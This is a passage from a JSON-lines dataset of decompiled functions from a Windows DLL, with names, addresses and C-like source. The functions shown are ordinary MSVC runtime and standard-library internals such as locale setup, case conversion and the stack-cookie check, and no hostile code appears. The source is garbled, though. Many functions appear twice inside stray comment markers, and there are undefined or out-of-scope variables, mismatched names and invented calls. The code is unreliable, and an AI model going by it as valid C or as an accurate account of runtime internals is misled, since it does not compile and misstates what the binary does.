*param_3[1] = (float)*param_3; \n        (*param_3)[1] = (float)param_3[1]; \n        *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1; \n        FUN_10012280(param_3); \n        *localFloatPointerPointer = floatPointer3; \n        *(undefined *)(localFloatPointerPointer + 1) = 0; \n        goto LAB_10013b63; \n    }\n    ushortValue1 = *(ushort *)param_2; \n    ushortValue2 = *(ushort *)ushortPointerPointer; \n    if (ushortValue2 <= ushortValue1) { \n        param_2 = (ushort **)((int)param_2 - (int)ushortPointerPointer); \n        bool boolCondition1 = ushortValue1 < ushortValue2; \n        bool boolCondition2 = ushortValue1 == ushortValue2; \n        float **nextFloatPointer = localFloatPointer; \n        do {\n            if (!boolCondition1 && !boolCondition2) break; \n            if (nextFloatPointer == (float **)0x1) goto LAB_10013a2a; \n            ushortPointerPointer = (ushort **)((int)ushortPointerPointer + 2); \n            nextFloatPointer = (float **)((int)nextFloatPointer + -1); \n            boolCondition1 = *(ushort *)((int)param_2 + (int)ushortPointerPointer) < *(ushort *)ushortPointerPointer; \n            boolCondition2 = *(ushort *)((int)param_2 + (int)ushortPointerPointer) == *(ushort *)ushortPointerPointer; \n        } while (!boolCondition1); \n    }\nLAB_10013b63:\n    ExceptionList = localPointer; \n    ___security_check_cookie_4(stackUintValue ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "Catch_All@10013c1b", "Address": "10013c1b", "Source Code": "void Catch_All_10013c1b(void)\n{\n    \n    function_call(*(void **)(base_pointer + 0xc));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)system_call(3))();\n}"}
{"Function Name": "FUN_10013c30", "Address": "10013c30", "Source Code": "void __thiscall FUN_10013c30(void *this, int *param_1, int *param_2)\n{\n    byte *bytePointer; \n    int indexValue; \n    int *intPointer; \n    uint counter = 0; \n    uint hashValue = 0x811c9dc5; \n    int **pointerToPointer = (int **)(param_2 + 2); \n    \n    if (7 < (uint)param_2[7]) {\n        pointerToPointer = (int **)*pointerToPointer; \n    }\n    \n    if (param_2[6] * 2 != 0) {\n        do {\n            bytePointer = (byte *)(counter + (int)pointerToPointer); \n            counter++; \n            hashValue = (*bytePointer ^ hashValue) * 0x1000193; \n        } while (counter < (uint)(param_2[6] * 2)); \n    }\n    \n    indexValue = (*(uint *)((int)this + 0x18) & hashValue) * 8; \n    intPointer = *(int **)(*(int *)((int)this + 0xc) + indexValue); \n    int *anotherIntPointer = (int *)(*(int *)((int)this + 0xc) + indexValue); \n    \n    if ((int *)anotherIntPointer[1] == param_2) {\n        \n        if (intPointer == param_2) {\n            *anotherIntPointer = *(int *)((int)this + 4); \n            *(undefined4 *)(indexValue + 4 + *(int *)((int)this + 0xc)) = *(undefined4 *)((int)this + 4); \n        } else {\n            anotherIntPointer[1] = param_2[1]; \n        }\n    } else if (intPointer == param_2) { \n        *anotherIntPointer = *param_2; \n    }\n    indexValue = *param_2; \n    *(int *)param_2[1] = indexValue; \n    *(int *)(*param_2 + 4) = param_2[1]; \n    *(int *)((int)this + 8) = *(int *)((int)this + 8) - 1; \n    FUN_10012280(param_2); \n    *param_1 = indexValue; \n    return; \n}"}
{"Function Name": "@__security_check_cookie@4", "Address": "10013cda", "Source Code": "void __fastcall ___security_check_cookie_4(int input_value)\n{\n    \n    if (input_value != expected_cookie_value) {\n        \n        report_security_failure();\n    }\n}"}
{"Function Name": "FUN_10013ceb", "Address": "10013ceb", "Source Code": "void __cdecl FUN_10013ceb(void *input_pointer)\n{\n    \n    thunk_FUN_1001dc78(input_pointer);\n}"}
{"Function Name": "FUN_10013d29", "Address": "10013d29", "Source Code": "\\*\nReturnType * method FUN_10013d29(void *object, ByteType flag)\n{\n    \n    *(undefined ***)object = type_info::vftable;\n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nReturnType * method FUN_10013d29(void *object, ByteType flag)\n{\n    *(undefined ***)object = type_info::vftable;\n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "thunk_FUN_1001dc78", "Address": "10013d4c", "Source Code": "void __cdecl thunk_FUN_1001dc78(void *memory_pointer)\n{\n    \n    FID_conflict__free(memory_pointer);\n}"}
{"Function Name": "FUN_10013d51", "Address": "10013d51", "Source Code": "void __cdecl FUN_10013d51(size_t input_size) \n{\n    FUN_10013cf9(input_size); \n}"}
{"Function Name": "thunk_FUN_1001dc78", "Address": "10013d5a", "Source Code": "void __cdecl thunk_FUN_1001dc78(void *memory_pointer)\n{\n    \n    FID_conflict__free(memory_pointer);\n}"}
{"Function Name": "___scrt_dllmain_crt_thread_detach", "Address": "10013e4a", "Source Code": "undefined threadDetachHandler(void)\n{\n    \n    vcrtThreadDetach();\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_10013eae", "Address": "10013eae", "Source Code": "void function_main(void) \n{\n    function_helper(); \n}"}
{"Function Name": "FUN_100141c0", "Address": "100141c0", "Source Code": "void FUN_100141c0(size_t input_size) \n{\n    FUN_100143c4(input_size); \n}"}
{"Function Name": "Catch_All@100143fc", "Address": "100143fc", "Source Code": "undefined * catchAllFunction(void)\n{\n    \n    return &dataPointer;\n}"}
{"Function Name": "FUN_10014414", "Address": "10014414", "Source Code": "void __cdecl FUN_10014414(void *input_parameter)\n{\n    \n    thunk_FUN_1001dc78(input_parameter);\n}"}
{"Function Name": "FUN_100145e1", "Address": "100145e1", "Source Code": "void FUN_100145e1(void) \n{\n    \n    \n    \n    release_startup_lock((char)*(undefined4 *)(*(int *)0xFFFFFFFF - 0x1d));\n}"}
{"Function Name": "dllmain_crt_process_detach", "Address": "100145f3", "Source Code": "int __cdecl dllmain_crt_process_detach(bool is_process_detached)\n{\n    uint return_value; \n    int function_return_value;  \n    \n    if (reference_count < 1) {\n        return_value = 0; \n    }\n    else {\n        \n        reference_count = reference_count - 1;\n        \n        ___scrt_acquire_startup_lock();\n        \n        \n        if (state != 2) {\n            \n            ___scrt_fastfail(7);\n            \n            function_return_value = ((code *)swi(3))();\n            return function_return_value; \n        }\n        \n        \n        FUN_10013e8b();\n        \n        __scrt_uninitialize_type_info();\n        \n        __RTC_Terminate();\n        \n        state = 0;\n        \n        return_value = (uint)((char)___scrt_uninitialize_crt(is_process_detached, '\\0') != '\\0');\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_1001466e", "Address": "1001466e", "Source Code": "void initializeFunction(void)\n{\n    \n    executeFunction();\n    \n    \n    releaseStartupLock((char)*(undefined4 *)(basePointer + -0x1c));\n}"}
{"Function Name": "FUN_100147f4", "Address": "100147f4", "Source Code": "\\*\nundefined4 * __fastcall FUN_100147f4(undefined4 *allocation_info)\n{\n    \n    allocation_info[1] = \"bad allocation\";\n    \n    \n    *allocation_info = std::bad_alloc::vftable;\n    \n    \n    return allocation_info;\n}\n*\\ \n \nundefined4 * __fastcall FUN_100147f4(undefined4 *allocation_info)\n{\n    allocation_info[1] = \"bad allocation\";\n    *allocation_info = std::bad_alloc::vftable;\n    return allocation_info;\n}"}
{"Function Name": "FUN_10014827", "Address": "10014827", "Source Code": "\\*\nundefined4 * __fastcall set_error_message(undefined4 *array_pointer)\n{\n    \n    array_pointer[1] = \"bad array new length\";\n    \n    \n    *array_pointer = std::bad_array_new_length::vftable;\n    \n    \n    return array_pointer;\n}\n*\\ \n \nundefined4 * __fastcall set_error_message(undefined4 *array_pointer)\n{\n    array_pointer[1] = \"bad array new length\";\n    *array_pointer = std::bad_array_new_length::vftable;\n    return array_pointer;\n}"}
{"Function Name": "FUN_1001486c", "Address": "1001486c", "Source Code": "void FUN_1001486c(void)\n{\n    code *functionPointer; \n    int integerArray[3]; \n    FUN_100147f4(integerArray); \n    __CxxThrowException_8(integerArray, &DAT_1004bc3c); \n    (*((code *)swi(3)))(); \n}"}
{"Function Name": "___scrt_is_ucrt_dll_in_use", "Address": "10014a41", "Source Code": "bool ___scrt_is_ucrt_dll_in_use(void)\n{\n    \n    return ucrt_dll_status != 0;\n}"}
{"Function Name": "FUN_10014b67", "Address": "10014b67", "Source Code": "void FUN_10014b67(void) \n{\n    memoryAddressValue = 0; \n}"}
{"Function Name": "FUN_10014c64", "Address": "10014c64", "Source Code": "void initializeSListHeadFunction(void) \n{\n    \n    InitializeSListHead((PSLIST_HEADER)&sListHeader);\n}"}
{"Function Name": "__scrt_uninitialize_type_info", "Address": "10014c70", "Source Code": "void __cdecl __scrt_uninitialize_type_info(void)\n{\n    \n    \n    ___std_type_info_destroy_list((PSLIST_HEADER)&type_info_list);\n}"}
{"Function Name": "FUN_10014c99", "Address": "10014c99", "Source Code": "undefined * getUndefinedPointer(void)\n{\n    \n    return &globalVariable;\n}"}
{"Function Name": "std::_Lockit::_Lockit", "Address": "10014d24", "Source Code": "\\*\nLockInstance * __thiscall std::LockInstance::LockInstance(LockInstance *currentInstance, int inputValue)\n{\n    \n    *(int *)currentInstance = inputValue;\n    \n    if (inputValue == 0) {\n        \n        __lock_locales();\n    } \n    \n    else if (inputValue < 8) {\n        \n        __Mtxlock((_Rmtx *)(&DAT_1004f970 + inputValue * 0x18));\n    }\n    \n    return currentInstance;\n}\n*\\ \n \nLockInstance * __thiscall std::LockInstance::LockInstance(LockInstance *currentInstance, int inputValue)\n{\n    *(int *)currentInstance = inputValue;\n    if (inputValue == 0) {\n        __lock_locales();\n    } else if (inputValue < 8) {\n        __Mtxlock((_Rmtx *)(&DAT_1004f970 + inputValue * 0x18));\n    }\n    return currentInstance;\n}"}
{"Function Name": "FUN_10014d55", "Address": "10014d55", "Source Code": "int FUN_10014d55(void) \n{\n    int modifiedValue; \n    LPCRITICAL_SECTION criticalSectionPointer; \n    acquireLock(); \n    modifiedValue = sharedValue - 1; \n    releaseLock(); \n    sharedValue = modifiedValue; \n    if (modifiedValue < 0) { \n        criticalSectionPointer = (LPCRITICAL_SECTION)&criticalSectionStart; \n        do { \n            modifiedValue = processCriticalSection(criticalSectionPointer); \n            criticalSectionPointer++; \n        } while ((int)criticalSectionPointer < 0x1004fa30); \n    }\n    return modifiedValue; \n}"}
{"Function Name": "FUN_10014d7c", "Address": "10014d7c", "Source Code": "void __fastcall FUN_10014d7c(int *valuePointer)\n{\n    \n    if (*valuePointer != 0) {\n        \n        if (*valuePointer < 8) {\n            \n            processCriticalSection((LPCRITICAL_SECTION)(&criticalSectionBase + *valuePointer * 0x18));\n        }\n        \n        return;\n    }\n    \n    unlockResource(4);\n}"}
{"Function Name": "std::locale::_Locimp::_Locimp", "Address": "10014d9b", "Source Code": "\\*\nLocaleImplementation * __thiscall std::locale::LocaleImplementation::LocaleImplementation(LocaleImplementation *instance, bool isInitialized)\n{\n    \n    *(undefined4 *)(instance + 4) = 1;\n    \n    *(undefined ***)instance = virtualFunctionTable;\n    \n    instance[0x14] = (_Locimp)isInitialized;\n    \n    *(undefined4 *)(instance + 0x18) = 0;\n    \n    instance[0x1c] = (_Locimp)0x0;\n    \n    _Yarn<char>::operator=((_Yarn<char> *)(instance + 0x18), \"*\");\n    \n    return instance;\n}\n*\\ \n \nLocaleImplementation * __thiscall std::locale::LocaleImplementation::LocaleImplementation(LocaleImplementation *instance,bool isInitialized)\n{\n    *(undefined4 *)(instance + 4) = 1;\n    *(undefined ***)instance = virtualFunctionTable;\n    instance[0x14] = (_Locimp)isInitialized;\n    *(undefined4 *)(instance + 0x18) = 0;\n    instance[0x1c] = (_Locimp)0x0;\n    _Yarn<char>::operator=((_Yarn<char> *)(instance + 0x18),\"*\");\n    return instance;\n}"}
{"Function Name": "std::_Fac_node::~_Fac_node", "Address": "10014ddc", "Source Code": "void __thiscall std::_Fac_node::~_Fac_node(_Fac_node *node) \n{\n    code *functionPointer; \n    undefined4 *resultPointer; \n    void *currentExceptionList = exceptionList; \n    exceptionList = &currentExceptionList; \n    functionPointer = *(code **)(**(int **)(node + 4) + 8); \n    (*(code *)guardCheckPointer)(dataValue ^ (uint)&stackPointer); \n    resultPointer = (undefined4 *)(*functionPointer)(); \n    if (resultPointer != (undefined4 *)0x0) { \n        functionPointer = *(code **)*resultPointer; \n        (*(code *)guardCheckPointer)(1); \n        (*functionPointer)(); \n    }\n    exceptionList = currentExceptionList; \n    return; \n}"}
{"Function Name": "FUN_10014e3b", "Address": "10014e3b", "Source Code": "void FUN_10014e3b(void) \n{\n    undefined4 *currentNode; \n    while ((currentNode = headNode) != (undefined4 *)0x0) { \n        headNode = (undefined4 *)*currentNode; \n        std::_Fac_node::~_Fac_node((_Fac_node *)currentNode); \n        processNode(currentNode); \n    }\n}"}
{"Function Name": "std::locale::_Locimp::~_Locimp", "Address": "10014e62", "Source Code": "void __thiscall std::locale::_Locimp::~_Locimp(_Locimp *locimp_instance)\n{\n    \n    exception_list = &exception_list;\n    \n    *(undefined ***)locimp_instance = virtual_function_table;\n    \n    locimp_destructor(locimp_instance);\n    \n    if (*(int *)(locimp_instance + 0x18) != 0) {\n        \n        function_pointer(*(void **)(locimp_instance + 0x18));\n    }\n    \n    *(undefined4 *)(locimp_instance + 0x18) = 0;\n    \n    *(undefined ***)locimp_instance = _Facet_base::virtual_function_table;\n    \n    return;\n}"}
{"Function Name": "std::_Yarn<char>::operator=", "Address": "10014ebb", "Source Code": "\\*\n_Yarn<char> * __thiscall std::_Yarn<char>::operator=(_Yarn<char> *currentObject,char *inputString)\n{\n    \n    if (*(char **)currentObject != inputString) {\n        \n        if (*(int *)currentObject != 0) {\n            \n            FUN_1001dc78(*(void **)currentObject);\n        }\n        \n        *(undefined4 *)currentObject = 0;\n        \n        \n        if (inputString != (char *)0x0) {\n            char *stringIterator = inputString;\n            \n            while (*stringIterator != '\\0') {\n                stringIterator++;\n            }\n            \n            undefined8 *allocatedMemory = (undefined8 *)FUN_10025334((size_t)(stringIterator + (1 - (int)inputString)));\n            \n            *(undefined8 **)currentObject = allocatedMemory;\n            \n            if (allocatedMemory != (undefined8 *)0x0) {\n                \n                FUN_10018670(allocatedMemory, (undefined8 *)inputString, (uint)(stringIterator + (1 - (int)inputString)));\n            }\n        }\n    }\n    \n    return currentObject;\n}\n*\\ \n \n_Yarn<char> * __thiscall std::_Yarn<char>::operator=(_Yarn<char> *currentObject,char *inputString)\n{\n    if (*(char **)currentObject != inputString) {\n        if (*(int *)currentObject != 0) {\n            FUN_1001dc78(*(void **)currentObject);\n        }\n        *(undefined4 *)currentObject = 0;\n        if (inputString != (char *)0x0) {\n            char *stringIterator = inputString;\n            while (*stringIterator != '\\0') {\n                stringIterator++;\n            }\n            undefined8 *allocatedMemory = (undefined8 *)FUN_10025334((size_t)(stringIterator + (1 - (int)inputString)));\n            *(undefined8 **)currentObject = allocatedMemory;\n            if (allocatedMemory != (undefined8 *)0x0) {\n                FUN_10018670(allocatedMemory, (undefined8 *)inputString, (uint)(stringIterator + (1 - (int)inputString)));\n            }\n        }\n    }\n    return currentObject;\n}"}
{"Function Name": "std::locale::_Locimp::`scalar_deleting_destructor'", "Address": "10014f0f", "Source Code": "void * __thiscall std::locale::locale_impl::_scalar_deleting_destructor_(_Locimp *this, uint flag)\n{\n    \n    ~locale_impl(this);\n    \n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(this);\n    }\n    \n    \n    return this;\n}"}
{"Function Name": "std::_Facet_Register", "Address": "10014f31", "Source Code": "void __cdecl std::_Facet_Register(_Facet_base *facetBase)\n{\n    \n    undefined4 *allocatedMemory = (undefined4 *)FUN_10013cf9(8);\n    \n    \n    if (allocatedMemory != (undefined4 *)0x0) {\n        \n        *allocatedMemory = globalPointer;\n        \n        \n        allocatedMemory[1] = facetBase;\n    }\n    \n    \n    globalPointer = allocatedMemory;\n    \n    \n    return;\n}"}
{"Function Name": "FUN_10014f5d", "Address": "10014f5d", "Source Code": "undefined4 getGlobalValue(void) \n{\n    return globalValue; \n}"}
{"Function Name": "std::locale::_Init", "Address": "10014f63", "Source Code": "\\*\n_Locimp * __cdecl std::locale::_Init(bool isParamTrue)\n{\n    code *functionPointer; \n    int *localeDataPointer; \n    _Locimp *currentLocaleInstance; \n    int lockArray[3]; \n    \n    _Lockit::_Lockit((_Lockit *)lockArray, 0); \n    \n    localeDataPointer = DAT_1004fa5c; \n    if (localeDataPointer == (int *)0x0) { \n        localeDataPointer = (int *)_Locimp::_New_Locimp(false); \n        _Setgloballocale(localeDataPointer); \n        localeDataPointer[4] = 0x3f; \n        _Yarn<char>::operator=((_Yarn<char> *)(localeDataPointer + 6), \"C\"); \n        functionPointer = *(code **)(*localeDataPointer + 4); \n        DAT_1004fa34 = localeDataPointer; \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*functionPointer)(); \n        _DAT_1004fa50 = DAT_1004fa34; \n    }\n    if (isParamTrue) { \n        functionPointer = *(code **)(*localeDataPointer + 4); \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*functionPointer)(); \n    }\n    FUN_10014d7c(lockArray); \n    currentLocaleInstance = (_Locimp *)FUN_10036ff7(); \n    return currentLocaleInstance; \n}\n*\\ \n \n_Locimp * __cdecl std::locale::_Init(bool isParamTrue)\n{\n    code *functionPointer;\n    int *localeDataPointer;\n    _Locimp *currentLocaleInstance;\n    int lockArray[3];\n    \n    _Lockit::_Lockit((_Lockit *)lockArray, 0);\n    \n    localeDataPointer = DAT_1004fa5c;\n    if (localeDataPointer == (int *)0x0) {\n        localeDataPointer = (int *)_Locimp::_New_Locimp(false);\n        _Setgloballocale(localeDataPointer);\n        localeDataPointer[4] = 0x3f;\n        _Yarn<char>::operator=((_Yarn<char> *)(localeDataPointer + 6), \"C\");\n        functionPointer = *(code **)(*localeDataPointer + 4);\n        DAT_1004fa34 = localeDataPointer;\n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        (*functionPointer)();\n        _DAT_1004fa50 = DAT_1004fa34;\n    }\n    if (isParamTrue) {\n        functionPointer = *(code **)(*localeDataPointer + 4);\n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        (*functionPointer)();\n    }\n    FUN_10014d7c(lockArray);\n    currentLocaleInstance = (_Locimp *)FUN_10036ff7();\n    return currentLocaleInstance;\n}"}
{"Function Name": "std::locale::_Locimp::_Locimp_dtor", "Address": "10014ff3", "Source Code": "void __cdecl std::locale::_Locimp::_Locimp_dtor(_Locimp *loc_imp)\n{\n    code *function_pointer; \n    int item_count; \n    _Lockit::_Lockit((_Lockit *)&lock_instance, 0); \n    item_count = *(int *)(loc_imp + 0xc); \n    while (item_count != 0) { \n        item_count = item_count - 1; \n        int *current_item_pointer = *(int **)(*(int *)(loc_imp + 8) + item_count * 4); \n        if (current_item_pointer != (int *)0x0) { \n            function_pointer = *(code **)(*current_item_pointer + 8); \n            (*(code *)PTR__guard_check_icall_1003a2f8)(); \n            current_item_pointer = (int *)(*function_pointer)(); \n            if (current_item_pointer != (int *)0x0) { \n                function_pointer = *(code **)*current_item_pointer; \n                (*(code *)PTR__guard_check_icall_1003a2f8)(1); \n                (*function_pointer)(); \n            }\n        }\n    }\n    FUN_1001dc78(*(void **)(loc_imp + 8)); \n    FUN_10014d7c(&lock_instance); \n    FUN_10036ff7(); \n    return; \n}"}
{"Function Name": "std::_Locinfo::_Locinfo_ctor", "Address": "1001506a", "Source Code": "void __cdecl std::_Locinfo::_Locinfo_ctor(_Locinfo *locinfo, char *inputString)\n{\n    \n    char *charPointer = (char *)FUN_100268a6(0, 0);\n    \n    \n    if (charPointer == (char *)0x0) {\n        charPointer = \"\";\n    }\n    \n    \n    _Yarn<char>::operator=((_Yarn<char> *)(locinfo + 0x24), charPointer);\n    \n    \n    charPointer = (inputString != (char *)0x0) ? (char *)FUN_100268a6(0, (char)inputString) : (char *)0x0;\n    \n    \n    if (charPointer == (char *)0x0) {\n        charPointer = \"*\";\n    }\n    \n    \n    _Yarn<char>::operator=((_Yarn<char> *)(locinfo + 0x2c), charPointer);\n}"}
{"Function Name": "FUN_100150b5", "Address": "100150b5", "Source Code": "void __cdecl FUN_100150b5(int input_param) \n{\n    if (*(int *)(input_param + 0x24) != 0) { \n        process_value(0, (char)*(undefined4 *)(input_param + 0x24)); \n    }\n}"}
{"Function Name": "std::locale::_Locimp::_New_Locimp", "Address": "100150cf", "Source Code": "\\*\nLocaleImplementation * __cdecl std::locale::LocaleImplementation::_New_Locimp(bool param_1)\n{\n    \n    _Locimp *allocatedLocale = (_Locimp *)FUN_10013cf9(0x20);\n    \n    \n    if (allocatedLocale != (_Locimp *)0x0) {\n        \n        return (_Locimp *)LocaleImplementation(allocatedLocale, isDefault);\n    }\n    \n    \n    return (_Locimp *)0x0;\n}\n*\\ \n \nLocaleImplementation * __cdecl std::locale::LocaleImplementation::_New_Locimp(bool param_1)\n{\n    _Locimp *allocatedLocale = (_Locimp *)FUN_10013cf9(0x20);\n    if (allocatedLocale != (_Locimp *)0x0) {\n        return (_Locimp *)LocaleImplementation(allocatedLocale, isDefault);\n    }\n    return (_Locimp *)0x0;\n}"}
{"Function Name": "std::locale::_Setgloballocale", "Address": "100150f2", "Source Code": "void __cdecl std::locale::_Setgloballocale(void *param_1)\n{\n    \n    if (global_locale_initialized == '\\0') {\n        \n        global_locale_initialized = '\\x01';\n        \n        register_cleanup_function(cleanup_function);\n    }\n    \n    global_locale_param = param_1;\n}"}
{"Function Name": "_tidy_global", "Address": "10015155", "Source Code": "void cleanupGlobalState(void)\n{\n    \n    std::_Lockit::LockGuard((_Lockit *)&lockGuardInstance, 0);\n    \n    \n    deleteGlobalLocale((int **)&globalLocalePointer);\n    \n    \n    globalLocalePointer = 0;\n    \n    \n    unlockAndCleanup((int *)&lockGuardInstance);\n}"}
{"Function Name": "__Tolower", "Address": "100151e7", "Source Code": "int __cdecl __Tolower(int inputChar, _Ctypevec *ctypeVec)\n{\n    UINT destCodePage; \n    uint conversionFlag;    \n    LPCSTR srcStrPtr; \n    int mappingResult;     \n    _locale_t localeInfo; \n    \n    if (ctypeVec == (_Ctypevec *)0x0) {\n        \n        localeInfo = (_locale_t)____lc_locale_name_func()[2];\n        destCodePage = ____lc_codepage_func();\n    } else {\n        \n        localeInfo = (_locale_t)ctypeVec->_LocaleName;\n        destCodePage = ctypeVec->_Page;\n    }\n    \n    if (localeInfo == (_locale_t)0x0) {\n        \n        if (inputChar < 0x41 || inputChar > 0x5a) {\n            return inputChar;\n        }\n        \n        return inputChar + 0x20;\n    }\n    \n    if ((uint)inputChar < 0x100) {\n        \n        if (ctypeVec != (_Ctypevec *)0x0 && (*(byte *)(ctypeVec->_Table + inputChar) & 1) == 0) {\n            return inputChar;\n        }\n        \n        conversionFlag = FUN_100269f7(inputChar);\n        \n        if (conversionFlag == 0) {\n            return inputChar;\n        }\n    } else {\n        \n        if (ctypeVec != (_Ctypevec *)0x0) {\n            conversionFlag = (uint)(int)ctypeVec->_Table[inputChar >> 8 & 0xff] >> 0xf & 1;\n        } else {\n            conversionFlag = ___pctype_func()[inputChar >> 8 & 0xff] & 0x8000;\n        }\n    }\n    \n    if (conversionFlag == 0) {\n        srcStrPtr = (LPCSTR)0x1; \n        char charToConvert = (char)inputChar; \n    } else {\n        srcStrPtr = (LPCSTR)0x2; \n        char charToConvert = (char)((uint)inputChar >> 8); \n        char lowByte = (char)inputChar; \n    }\n    \n    mappingResult = ___crtLCMapStringA(localeInfo, (LPCWSTR)0x100, (DWORD)&charToConvert, srcStrPtr, (int)&mappedChar, (LPSTR)0x3, destCodePage, 1, 0);\n    \n    if ((mappingResult != 0) && (inputChar = (int)mappedChar, mappingResult != 1)) {\n        inputChar = (int)CONCAT11(mappedChar, 0); \n    }\n    return inputChar; \n}"}
{"Function Name": "FUN_100153e7", "Address": "100153e7", "Source Code": "void FUN_100153e7(char *inputString)\n{\n    code *functionPointer; \n    int dataArray[3]; \n    FUN_10015373(dataArray, inputString); \n    __CxxThrowException_8(dataArray, &DAT_1004bd24); \n    functionPointer = (code *)swi(3); \n    (*functionPointer)(); \n}"}
{"Function Name": "FUN_10015407", "Address": "10015407", "Source Code": "void FUN_10015407(char *input_string)\n{\n    code *function_pointer; \n    int integer_array[3]; \n    \n    FUN_100153c8(integer_array, input_string);\n    \n    __CxxThrowException_8(integer_array, &DAT_1004bd60);\n    \n    (*((code *)swi(3)))();\n}"}
{"Function Name": "__Toupper", "Address": "10015427", "Source Code": "int __cdecl __Toupper(int input_char, _Ctypevec *ctype_vector)\n{\n    UINT code_page_size; \n    _locale_t locale_info; \n    byte converted_char; \n    undefined temp_char_high; \n    undefined temp_char_low; \n    \n    if (ctype_vector == (_Ctypevec *)0x0) {\n        wchar_t **locale_names = ____lc_locale_name_func(); \n        locale_info = (_locale_t)locale_names[2]; \n        code_page_size = ____lc_codepage_func(); \n    } else {\n        locale_info = (_locale_t)ctype_vector->_LocaleName; \n        code_page_size = ctype_vector->_Page; \n    }\n    \n    if (locale_info == (_locale_t)0x0) {\n        \n        if (input_char < 0x61 || 0x7a < input_char) {\n            return input_char; \n        }\n        return input_char - 0x20; \n    }\n    uint char_type_info; \n    \n    if ((uint)input_char < 0x100) {\n        if (ctype_vector != (_Ctypevec *)0x0) {\n            \n            if ((*(byte *)(ctype_vector->_Table + input_char) & 2) == 0) {\n                return input_char; \n            }\n        } else {\n            char_type_info = FUN_100269ca(input_char); \n            if (char_type_info == 0) {\n                return input_char; \n            }\n        }\n    } else {\n        \n        if (ctype_vector != (_Ctypevec *)0x0) {\n            char_type_info = (uint)(int)ctype_vector->_Table[input_char >> 8 & 0xff] >> 0xf & 1; \n        } else {\n            char_type_info = ___pctype_func()[input_char >> 8 & 0xff] & 0x8000; \n        }\n    }\n    \n    if (char_type_info == 0) {\n        temp_char_low = 0; \n        temp_char_high = (char)input_char; \n    } else {\n        temp_char_high = (char)((uint)input_char >> 8); \n        temp_char_low = (char)input_char; \n    }\n    \n    int conversion_result = ___crtLCMapStringA(locale_info, (LPCWSTR)0x200, (DWORD)&temp_char_high, (LPCSTR)(char_type_info ? 0x2 : 0x1), (int)&converted_char, (LPSTR)0x3, code_page_size, 1, 0);\n    \n    if ((conversion_result != 0) && (input_char = (int)converted_char, conversion_result != 1)) {\n        input_char = (int)CONCAT11(converted_char, 0); \n    }\n    return input_char; \n}"}
{"Function Name": "std::_Syserror_map", "Address": "10015525", "Source Code": "char * __cdecl std::_Syserror_map(int error_code)\n{\n    int *error_mapping_ptr = &error_mapping_start; \n    while (error_mapping_ptr != (int *)&error_mapping_end) { \n        if (*error_mapping_ptr == error_code) { \n            return (char *)error_mapping_ptr[1]; \n        }\n        error_mapping_ptr += 2; \n    }\n    return \"unknown error\"; \n}"}
{"Function Name": "std::_Fgetc<char>", "Address": "1001554a", "Source Code": "bool __cdecl std::_Fgetc<char>(char *output_char_pointer, _iobuf *input_buffer)\n{\n    \n    int read_character = _fgetc(input_buffer);\n    \n    \n    if (read_character == -1) {\n        return false; \n    }\n    \n    \n    *output_char_pointer = (char)read_character;\n    \n    \n    return true;\n}"}
{"Function Name": "std::_Fputc<char>", "Address": "1001556a", "Source Code": "bool __cdecl std::_Fputc<char>(char character, _iobuf *file_buffer)\n{\n    \n    return _fputc((int)character, file_buffer) != -1; \n}"}
{"Function Name": "std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Reallocate_grow_by<class_<lambda_15711c68e099a15a58f4d77303cb286d>,char>", "Address": "10015584", "Source Code": "\\*\nbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall\nstd::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::\n_Reallocate_grow_by<class_<lambda_15711c68e099a15a58f4d77303cb286d>,char>\n(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this,\nuint param_1,undefined param_3)\n{\n    \n    uint uVar1 = *(uint *)(this + 0x10);\n    \n    \n    if (param_1 <= 0x7fffffff - uVar1) {\n        \n        uint uVar2 = *(uint *)(this + 0x14);\n        \n        \n        uint uVar5 = FUN_10005270(this, uVar1 + param_1);\n        \n        \n        *(uint *)(this + 0x10) = uVar1 + param_1;\n        *(uint *)(this + 0x14) = uVar5;\n        \n        \n        undefined8 *puVar6 = (undefined8 *)FUN_10004ff0(uVar5 + 1);\n        \n        \n        if (uVar2 < 0x10) {\n            FUN_10018670(puVar6, (undefined8 *)this, uVar1);\n        } else {\n            \n            undefined8 *puVar3 = *(undefined8 **)this;\n            FUN_10018670(puVar6, puVar3, uVar1);\n            FUN_10005040(puVar3, uVar2 + 1);\n        }\n        \n        \n        *(undefined *)((int)puVar6 + uVar1) = param_3;\n        \n        \n        *(undefined *)((int)puVar6 + uVar1 + 1) = 0;\n        \n        \n        *(undefined8 **)this = puVar6;\n        \n        \n        return this;\n    }\n    \n    \n    FUN_10005260();\n    code *pcVar4 = (code *)swi(3);\n    \n    \n    return (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)(*pcVar4)();\n}\n*\\ \n \nbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall\nstd::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::\n_Reallocate_grow_by<class_<lambda_15711c68e099a15a58f4d77303cb286d>,char>\n(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this,\nuint param_1,undefined param_3)\n{\n    uint uVar1 = *(uint *)(this + 0x10);\n    if (param_1 <= 0x7fffffff - uVar1) {\n        uint uVar2 = *(uint *)(this + 0x14);\n        uint uVar5 = FUN_10005270(this, uVar1 + param_1);\n        *(uint *)(this + 0x10) = uVar1 + param_1;\n        *(uint *)(this + 0x14) = uVar5;\n        undefined8 *puVar6 = (undefined8 *)FUN_10004ff0(uVar5 + 1);\n        \n        if (uVar2 < 0x10) {\n            FUN_10018670(puVar6, (undefined8 *)this, uVar1);\n        } else {\n            undefined8 